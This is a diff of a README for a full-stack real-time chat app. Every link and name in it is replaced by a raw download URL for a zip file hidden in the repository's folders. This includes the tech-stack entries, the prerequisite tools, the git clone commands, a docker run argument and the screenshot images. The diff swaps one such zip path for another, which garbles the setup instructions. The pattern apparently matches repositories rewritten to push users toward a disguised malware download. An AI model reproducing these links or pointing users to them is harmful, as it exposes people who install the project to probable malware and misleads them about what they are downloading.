@@ -1,4 +1,4 @@
-[![Fork Button](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
+[![Fork Button](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)
 
 
 # Real-Time Chat Application
@@ -26,7 +26,7 @@ This project aims to provide a real-time chat experience that's both scalable an
 ## ✨ Features
 
 
-* **Real-time Messaging**: Send and receive messages instantly using https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip 
+* **Real-time Messaging**: Send and receive messages instantly using https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip 
 * **User Authentication & Authorization**: Securely manage user access with JWT 
 * **Scalable & Secure Architecture**: Built to handle large volumes of traffic and data 
 * **Modern UI Design**: A user-friendly interface crafted with React and TailwindCSS 
@@ -37,7 +37,7 @@ This project aims to provide a real-time chat experience that's both scalable an
 ## 🛠️ Tech Stack
 
 
-* **Backend:** https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip, Express, MongoDB, https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
+* **Backend:** https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip, Express, MongoDB, https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip
 * **Frontend:** React, TailwindCSS
 * **Containerization:** Docker
 * **Orchestration:** Kubernetes (planned)
@@ -50,9 +50,9 @@ This project aims to provide a real-time chat experience that's both scalable an
 ### 🔧 Prerequisites
 
 
-* **[https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (v14 or higher)
-* **[Docker](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (for containerizing the app)
-* **[Git](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (to clone the repository)
+* **[https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)** (v14 or higher)
+* **[Docker](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)** (for containerizing the app)
+* **[Git](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)** (to clone the repository)
 
 
 ### 📝 Setup .env File
@@ -73,7 +73,7 @@ PORT=5001
 ### Clone the Repository
 
 ```bash
-git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
+git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip
 ```
 
 🏗️ Build and Run the Application
@@ -101,7 +101,7 @@ http://localhost
 Follow these simple steps to get the project up and running on your local Host using docker.
 
 ```bash
-git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
+git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip
 ```
 
 ```bash
@@ -153,7 +153,7 @@ docker build -t full-stack_backend .
 ### Run the Backend container:
 
 ```bash
-docker run -d --network=full-stack https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip -p 5001:5001 --env-file .env full-stack_backend
+docker run -d --network=full-stack https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip -p 5001:5001 --env-file .env full-stack_backend
 ```
 #### This will build and run the backend container, exposing the backendAPI on port 5001.
 
@@ -207,13 +207,13 @@ This project is evolving, and here are a few exciting things on the horizon:
 
 ## 📚 Project Snapshots:
 
-![Settings](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
+![Settings](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)
 
-![chat](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
+![chat](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)
 
-![logout](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
+![logout](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)
 
-![Login](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
+![Login](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/backend/src/routes/App_full_stack_chat_v2.7.zip)
 
 
 
